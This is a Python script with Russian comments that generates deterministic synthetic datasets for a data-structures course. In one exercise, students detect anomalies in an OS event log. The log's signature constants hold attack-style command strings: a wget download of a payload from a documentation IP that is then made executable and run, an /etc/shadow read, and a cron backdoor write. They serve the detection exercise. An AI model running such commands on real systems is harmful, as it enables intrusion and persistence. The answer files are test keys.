#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Генерация синтетических наборов данных дисциплины «Структуры и алгоритмы обработки данных».

Скрипт создаёт все наборы данных для лабораторных работ и дополнительных
практических заданий (ДЗ). Данные полностью синтетические и детерминированные:
при одном и том же номере варианта файлы совпадают побайтно (seed = 30 + вариант,
см. docs/reproducibility.md). Используются только стандартная библиотека и numpy.

Наборы (аргумент --only):
  arrays      — массивы целых чисел: случайные / отсортированные / обратно
                отсортированные / с большим числом дубликатов (ЛР 1, 3, 4, 6);
  ops         — последовательности операций над стеком и деком и размеры
                серий append для динамического массива (ЛР 2);
  texts       — тексты над малым алфавитом и «естественные» псевдослова из слогов
                плюс шаблоны с гарантированными вхождениями (ЛР 7);
  pairs       — строковые ключи user_XXXX с управляемой долей повторов (ЛР 8);
  logs        — журнал событий ОС с внедрёнными аномалиями и файл ответов
                для самопроверки (ДЗ 3, кейс ГК «Астра»);
  embeddings  — псевдо-эмбеддинги резюме и вакансий с кластерной структурой
                и эталон соответствий (ДЗ 4, кейс hh.ru);
  all         — все наборы (по умолчанию).

Примеры запуска (из корня репозитория):
    python scripts/generate_data.py --variant 7
    python scripts/generate_data.py --variant 7 --only logs
    python scripts/generate_data.py --variant 7 --only embeddings --out /tmp/data

Файлы создаются в data/generated/ (переопределяется через --out) и в репозиторий
не коммитятся. Параметры объёма у функций-генераторов вынесены в аргументы,
чтобы smoke-тесты (tests/test_generate_data.py) работали на малых объёмах.
"""
from __future__ import annotations

import argparse
import json
import random
from datetime import datetime, timedelta
from pathlib import Path

import numpy as np

REPO_ROOT = Path(__file__).resolve().parent.parent
DEFAULT_OUT = REPO_ROOT / "data" / "generated"
BASE_SEED = 30  # seed варианта = BASE_SEED + номер варианта

# ---------------------------------------------------------------------------
# 1. Массивы целых чисел (ЛР 1, 3, 4, 6)
# ---------------------------------------------------------------------------

ARRAY_SIZES = (1_000, 3_000, 10_000, 30_000, 100_000)


def generate_arrays(out_dir: Path, seed: int,
                    sizes: tuple[int, ...] = ARRAY_SIZES) -> list[Path]:
    """Массивы int по одному числу в строке: random / sorted / reversed / dups."""
    rng = np.random.default_rng(seed)
    paths: list[Path] = []
    for n in sizes:
        base = rng.integers(-1_000_000, 1_000_001, size=n)
        dups = rng.integers(0, max(10, n // 100), size=n)  # узкий диапазон => много дубликатов
        variants = {
            f"arrays_random_{n}.txt": base,
            f"arrays_sorted_{n}.txt": np.sort(base),
            f"arrays_reversed_{n}.txt": np.sort(base)[::-1],
            f"arrays_dups_{n}.txt": dups,
        }
        for name, arr in variants.items():
            path = out_dir / name
            path.write_text("\n".join(map(str, arr.tolist())) + "\n", encoding="utf-8")
            paths.append(path)
    return paths


# ---------------------------------------------------------------------------
# 2. Операции над линейными структурами (ЛР 2)
# ---------------------------------------------------------------------------

OPS_LENGTH = 100_000
OPS_MAX_SIZE = 5_000
APPEND_SIZE_RANGE = (1_000, 200_000)
STACK_OPS = {"push": 1, "pop": 0, "peek": 0}  # операция -> число аргументов
DEQUE_OPS = {"push_front": 1, "push_back": 1, "pop_front": 0, "pop_back": 0}


def _ops_walk(rng: random.Random, n_ops: int, max_size: int,
              pushes: tuple[str, ...], pops: tuple[str, ...],
              peek: str | None) -> list[str]:
    """Случайное блуждание размера структуры фазами «рост до цели — спад до нуля».

    Цель фазы равномерна по логарифмической шкале на [1, max_size], поэтому
    встречаются и крошечные структуры, и структуры в тысячи элементов, а размер
    пересекает границы роста ёмкости в обе стороны. После спада иногда следует
    операция над пустой структурой — эталон на ней бросает IndexError.
    """
    lines: list[str] = []
    size = 0

    def step(grow: bool) -> None:
        nonlocal size
        if peek is not None and rng.random() < 0.1:
            lines.append(peek)
        elif rng.random() < (0.7 if grow else 0.3):
            lines.append(f"{rng.choice(pushes)} {rng.randrange(1_000_000)}")
            size += 1
        else:
            lines.append(rng.choice(pops))
            size = max(0, size - 1)

    while len(lines) < n_ops:
        target = int(max_size ** rng.random())
        while size < target and len(lines) < n_ops:
            step(grow=True)
        while size > 0 and len(lines) < n_ops:
            step(grow=False)
        if rng.random() < 0.5:
            lines.append(rng.choice(pops if peek is None else (*pops, peek)))
    return lines[:n_ops]


def generate_ops(out_dir: Path, seed: int, n_ops: int = OPS_LENGTH,
                 max_size: int = OPS_MAX_SIZE, n_sizes: int = 8) -> list[Path]:
    """Операции над стеком и деком и размеры серий append.

    ops_stack.txt и ops_deque.txt — по одной операции в строке: «push 17», «pop»,
    «peek» для стека; «push_front 17», «push_back 17», «pop_front», «pop_back»
    для дека (сторона выбирается случайно). Последовательности многократно
    опустошают структуру и содержат операции над пустой структурой.

    ops_append_sizes.txt — размеры серий append по одному в строке: n_sizes
    значений, по одному на равный отрезок логарифмической шкалы
    APPEND_SIZE_RANGE, и пара 2**k, 2**k + 1 — размер ровно перед расширением
    буфера с начальной ёмкостью-степенью двойки и сразу после него.
    """
    rng = random.Random(seed)
    sequences = {
        "ops_stack.txt": _ops_walk(rng, n_ops, max_size, ("push",), ("pop",), "peek"),
        "ops_deque.txt": _ops_walk(rng, n_ops, max_size, ("push_front", "push_back"),
                                   ("pop_front", "pop_back"), None),
    }
    lo, hi = APPEND_SIZE_RANGE
    sizes = {int(lo * (hi / lo) ** ((i + rng.random()) / n_sizes)) for i in range(n_sizes)}
    k = rng.randint(lo.bit_length(), hi.bit_length() - 2)  # 2**k + 1 < hi
    sizes |= {2 ** k, 2 ** k + 1}
    sequences["ops_append_sizes.txt"] = [str(n) for n in sorted(sizes)]

    paths = []
    for name, lines in sequences.items():
        path = out_dir / name
        path.write_text("\n".join(lines) + "\n", encoding="utf-8")
        paths.append(path)
    return paths


# ---------------------------------------------------------------------------
# 3. Тексты и шаблоны (ЛР 7)
# ---------------------------------------------------------------------------

SMALL_ALPHABET = "abcdefg"
_SYLLABLES = tuple(c + v for c in "bdklmnprstv" for v in "aeiou")


def generate_texts(out_dir: Path, seed: int, length: int = 1_000_000,
                   n_patterns: int = 10) -> list[Path]:
    """Два текста ~length символов и n_patterns шаблонов длины 3–30.

    Каждый шаблон — подстрока соответствующего текста, поэтому вхождение
    гарантировано. Формат patterns.txt: имя_файла_текста<TAB>шаблон.
    """
    rng = random.Random(seed)
    small = "".join(rng.choices(SMALL_ALPHABET, k=length))

    words: list[str] = []
    total = 0
    while total < length:
        word = "".join(rng.choice(_SYLLABLES) for _ in range(rng.randint(2, 5)))
        words.append(word)
        total += len(word) + 1
    natural = " ".join(words)

    texts = {"texts_small_alphabet.txt": small, "texts_natural.txt": natural}
    names = sorted(texts)
    lines = []
    for i in range(n_patterns):
        name = names[i % len(names)]
        text = texts[name]
        while True:  # шаблон без краевых пробелов, длина 3–30
            m = rng.randint(3, 30)
            pos = rng.randrange(0, len(text) - m + 1)
            pattern = text[pos:pos + m]
            if pattern == pattern.strip():
                break
        lines.append(f"{name}\t{pattern}")

    paths = []
    for name, text in texts.items():
        path = out_dir / name
        path.write_text(text + "\n", encoding="utf-8")
        paths.append(path)
    patterns_path = out_dir / "patterns.txt"
    patterns_path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    paths.append(patterns_path)
    return paths


# ---------------------------------------------------------------------------
# 4. Строковые ключи (ЛР 8)
# ---------------------------------------------------------------------------


def generate_pairs(out_dir: Path, seed: int, n_keys: int = 100_000,
                   unique_share: float = 0.1) -> list[Path]:
    """Ключи вида user_XXXX; доля уникальных управляется unique_share."""
    rng = random.Random(seed)
    n_unique = max(1, min(10_000, int(n_keys * unique_share)))
    pool = [f"user_{i:04d}" for i in rng.sample(range(10_000), n_unique)]
    keys = rng.choices(pool, k=n_keys)
    path = out_dir / "pairs_keys.txt"
    path.write_text("\n".join(keys) + "\n", encoding="utf-8")
    return [path]


# ---------------------------------------------------------------------------
# 5. Журнал событий ОС с аномалиями (ДЗ 3, кейс ГК «Астра»)
# ---------------------------------------------------------------------------

EVENT_TYPES = ("login", "logout", "exec", "net_conn", "file_read", "file_write", "priv_esc")
_EVENT_WEIGHTS = (16, 14, 24, 18, 14, 13, 1)  # priv_esc в нормальном потоке редок
_PROCESSES = ("sshd", "cron", "bash", "systemd", "nginx", "postgres", "python3", "backup-agent")
_BURST_TYPES = ("login", "net_conn", "exec")
_SAFE_CMDS = ("/usr/bin/ls", "/usr/bin/ps", "/usr/bin/top", "/usr/sbin/logrotate",
              "/usr/bin/python3", "/usr/bin/rsync")
_SAFE_PATHS = ("/var/log/syslog", "/var/log/auth.log", "/home/user/report.txt",
               "/etc/hosts", "/tmp/cache.db", "/opt/app/config.yml")
_LOG_T0 = datetime(2026, 3, 1, 8, 0, 0)
BURST_WINDOW_SECONDS = 10

# Сигнатурные последовательности: ordered-подстроки в details соседних событий.
SIGNATURES = (
    {"name": "download-and-exec",
     "steps": (("exec", "cmd=wget http://198.51.100.7/payload.bin -O /tmp/.cache.bin"),
               ("exec", "cmd=chmod +x /tmp/.cache.bin"),
               ("exec", "cmd=/tmp/.cache.bin"))},
    {"name": "shadow-read-privesc",
     "steps": (("file_read", "path=/etc/shadow"),
               ("priv_esc", "target=root method=sudo-misconfig"),
               ("file_write", "path=/etc/cron.d/backdoor"))},
)


def _iso(t: int) -> str:
    return (_LOG_T0 + timedelta(seconds=t)).isoformat()


def _normal_details(rng: random.Random, event_type: str) -> str:
    if event_type in ("login", "logout"):
        return (f"user=user_{rng.randrange(10_000):04d} "
                f"ip=10.0.{rng.randrange(256)}.{rng.randrange(256)}")
    if event_type == "exec":
        return f"cmd={rng.choice(_SAFE_CMDS)} pid={rng.randrange(1_000, 65_536)}"
    if event_type == "net_conn":
        return (f"dst=192.168.{rng.randrange(256)}.{rng.randrange(256)}:"
                f"{rng.randrange(1024, 65536)} proto={rng.choice(('tcp', 'udp'))}")
    if event_type in ("file_read", "file_write"):
        return f"path={rng.choice(_SAFE_PATHS)} pid={rng.randrange(1_000, 65_536)}"
    return f"target=root method={rng.choice(('sudo', 'su'))}"  # priv_esc


def generate_logs(out_dir: Path, seed: int, n_events: int = 100_000,
                  n_bursts: int = 3, burst_size: int = 60,
                  n_signatures: int = 3) -> list[Path]:
    """Журнал «timestamp;process;event_type;details» + ответы для самопроверки.

    Аномалии двух видов: всплеск событий одного типа в 10-секундном окне
    и сигнатурные последовательности подстрок в details (см. SIGNATURES).
    Позиции внедрений пишутся в logs_answers.json (индексы 0-based по строкам
    данных, заголовок не считается).
    """
    rng = random.Random(seed)
    n_anomalies = n_bursts + n_signatures
    schedule: dict[int, str] = {}
    if n_anomalies:
        seg = n_events // n_anomalies
        if seg < burst_size + 10:
            raise ValueError("n_events слишком мало для заданного числа аномалий")
        kinds = ["burst"] * n_bursts + ["signature"] * n_signatures
        rng.shuffle(kinds)
        for j, kind in enumerate(kinds):  # по одной аномалии на сегмент — без пересечений
            schedule[rng.randint(j * seg + 5, (j + 1) * seg - burst_size - 5)] = kind

    rows: list[str] = []
    bursts_ans: list[dict] = []
    sigs_ans: list[dict] = []
    t = 0
    sig_counter = 0
    for i in range(n_events):
        kind = schedule.get(i)
        if kind == "burst":
            etype = rng.choice(_BURST_TYPES)
            proc = rng.choice(_PROCESSES)
            t0 = t + rng.randint(1, 3)
            offsets = sorted(rng.randint(0, BURST_WINDOW_SECONDS - 1)
                             for _ in range(burst_size))
            start = len(rows)
            for off in offsets:
                rows.append(f"{_iso(t0 + off)};{proc};{etype};"
                            f"{_normal_details(rng, etype)}")
            bursts_ans.append({
                "event_type": etype,
                "process": proc,
                "count": burst_size,
                "start_index": start,
                "end_index": len(rows) - 1,
                "t_start": _iso(t0 + offsets[0]),
                "t_end": _iso(t0 + offsets[-1]),
                "window_seconds": BURST_WINDOW_SECONDS,
            })
            t = t0 + BURST_WINDOW_SECONDS
        elif kind == "signature":
            sig = SIGNATURES[sig_counter % len(SIGNATURES)]
            sig_counter += 1
            proc = rng.choice(_PROCESSES)
            t_step = t + rng.randint(1, 3)
            t_first = t_step
            indices = []
            for etype, details in sig["steps"]:
                indices.append(len(rows))
                rows.append(f"{_iso(t_step)};{proc};{etype};{details}")
                t_last = t_step
                t_step += rng.randint(0, 2)
            sigs_ans.append({
                "name": sig["name"],
                "substrings": [details for _, details in sig["steps"]],
                "indices": indices,
                "t_start": _iso(t_first),
                "t_end": _iso(t_last),
            })
            t = t_step
        t += rng.randint(1, 3)
        etype = rng.choices(EVENT_TYPES, weights=_EVENT_WEIGHTS, k=1)[0]
        rows.append(f"{_iso(t)};{rng.choice(_PROCESSES)};{etype};"
                    f"{_normal_details(rng, etype)}")

    csv_path = out_dir / "logs_events.csv"
    csv_path.write_text("timestamp;process;event_type;details\n"
                        + "\n".join(rows) + "\n", encoding="utf-8")
    answers = {
        "note": ("Индексы — 0-based номера строк данных в logs_events.csv "
                 "(строка заголовка не считается). Файл предназначен для "
                 "самопроверки решения ДЗ 3."),
        "bursts": bursts_ans,
        "signatures": sigs_ans,
    }
    json_path = out_dir / "logs_answers.json"
    json_path.write_text(json.dumps(answers, ensure_ascii=False, indent=2) + "\n",
                         encoding="utf-8")
    return [csv_path, json_path]


# ---------------------------------------------------------------------------
# 6. Псевдо-эмбеддинги резюме и вакансий (ДЗ 4, кейс hh.ru)
# ---------------------------------------------------------------------------


def generate_embeddings(out_dir: Path, seed: int, n_resumes: int = 2_000,
                        n_vacancies: int = 2_000, dim: int = 24, k: int = 8,
                        noise: float = 0.6) -> list[Path]:
    """Векторы с кластерной структурой (k «профессий») и эталон соответствий.

    CSV: первая колонка id, далее dim координат. В ground truth для каждого
    резюме перечислены id вакансий его кластера.
    """
    if n_vacancies < k:
        raise ValueError("n_vacancies должно быть не меньше числа кластеров k")
    rng = np.random.default_rng(seed)
    centers = rng.uniform(-10.0, 10.0, size=(k, dim))
    r_clusters = rng.integers(0, k, size=n_resumes)
    v_clusters = rng.integers(0, k, size=n_vacancies)
    v_clusters[:k] = np.arange(k)  # в каждом кластере есть хотя бы одна вакансия

    header = "id," + ",".join(f"d{j:02d}" for j in range(dim))
    paths = []
    tables = (
        ("embeddings_resumes.csv", "resume", r_clusters),
        ("embeddings_vacancies.csv", "vacancy", v_clusters),
    )
    for filename, prefix, clusters in tables:
        vectors = centers[clusters] + rng.normal(0.0, noise, size=(len(clusters), dim))
        lines = [header]
        for i, vec in enumerate(vectors):
            coords = ",".join(f"{x:.6f}" for x in vec)
            lines.append(f"{prefix}_{i:04d},{coords}")
        path = out_dir / filename
        path.write_text("\n".join(lines) + "\n", encoding="utf-8")
        paths.append(path)

    vac_by_cluster = {c: [] for c in range(k)}
    for i, c in enumerate(v_clusters.tolist()):
        vac_by_cluster[c].append(f"vacancy_{i:04d}")
    matches = {f"resume_{i:04d}": vac_by_cluster[c]
               for i, c in enumerate(r_clusters.tolist())}
    ground_truth = {
        "note": ("Для каждого резюме перечислены id вакансий его кластера-"
                 "«профессии» — эталон для самопроверки решения ДЗ 4."),
        "k": k,
        "matches": matches,
    }
    gt_path = out_dir / "embeddings_ground_truth.json"
    gt_path.write_text(json.dumps(ground_truth, ensure_ascii=False, indent=2) + "\n",
                       encoding="utf-8")
    paths.append(gt_path)
    return paths


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

GENERATORS = {
    "arrays": generate_arrays,
    "ops": generate_ops,
    "texts": generate_texts,
    "pairs": generate_pairs,
    "logs": generate_logs,
    "embeddings": generate_embeddings,
}

MANIFEST_NAME = "manifest.json"


def write_manifest(out_dir: Path, variant: int, seed: int,
                   sets_done: list[str], created: list[Path]) -> Path:
    """Записать/обновить manifest.json — паспорт сгенерированных данных.

    Манифест позволяет заготовкам лабораторных проверить, что данные в каталоге
    действительно относятся к заявленному варианту (см. заготовки ЛР 1 и ЛР 2).
    При повторном запуске с другим --only сведения о наборах накапливаются;
    смена варианта обнуляет манифест. Временных меток в файле нет: при одном
    варианте манифест, как и данные, совпадает побайтно.
    """
    path = out_dir / MANIFEST_NAME
    previous: dict = {}
    if path.is_file():
        try:
            previous = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            previous = {}
    if previous.get("variant") != variant:
        previous = {}  # каталог принадлежал другому варианту — начинаем заново

    sets_all = sorted(set(previous.get("sets", [])) | set(sets_done))
    files_all = sorted(set(previous.get("files", []))
                       | {p.name for p in created})
    manifest = {
        "variant": variant,
        "seed": seed,
        "base_seed": BASE_SEED,
        "sets": sets_all,
        "files": files_all,
    }
    path.write_text(json.dumps(manifest, ensure_ascii=False, indent=2) + "\n",
                    encoding="utf-8")
    return path


def main() -> None:
    ap = argparse.ArgumentParser(
        description="Генерация синтетических наборов данных дисциплины "
                    "(детерминированно по номеру варианта).")
    ap.add_argument("--variant", type=int, required=True,
                    help="номер варианта (seed = 30 + вариант)")
    ap.add_argument("--only", choices=[*GENERATORS, "all"], default="all",
                    help="какой набор генерировать (по умолчанию all)")
    ap.add_argument("--out", type=Path, default=DEFAULT_OUT,
                    help="каталог вывода (по умолчанию data/generated "
                         "относительно корня репозитория)")
    args = ap.parse_args()

    seed = BASE_SEED + args.variant
    out_dir = args.out
    out_dir.mkdir(parents=True, exist_ok=True)

    names = list(GENERATORS) if args.only == "all" else [args.only]
    created: list[Path] = []
    for name in names:
        created.extend(GENERATORS[name](out_dir, seed))
    manifest_path = write_manifest(out_dir, args.variant, seed, names, created)

    print(f"Вариант {args.variant} (seed={seed}), каталог {out_dir}; "
          f"создано файлов: {len(created)}")
    for path in created:
        print(f"  {path}")
    print(f"Паспорт данных: {manifest_path}")


if __name__ == "__main__":
    main()
